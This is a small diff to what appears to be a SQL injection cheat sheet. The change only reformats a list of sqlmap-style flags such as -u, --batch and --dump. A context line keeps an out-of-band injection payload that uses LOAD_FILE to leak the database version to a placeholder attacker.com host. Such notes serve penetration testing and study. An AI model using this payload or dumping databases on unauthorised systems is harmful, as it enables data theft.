@@ -8,10 +8,10 @@
 - Out-of-band SQL Injection: LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
 
 # Commands
--u: Provide URL
---batch: Skip user input
--r: Provide Request
---dump: Get all data 
+- -u: Provide URL
+- --batch: Skip user input
+- -r: Provide Request
+- --dump: Get all data 
 --cookie="id=1" 
 --level
 --risk
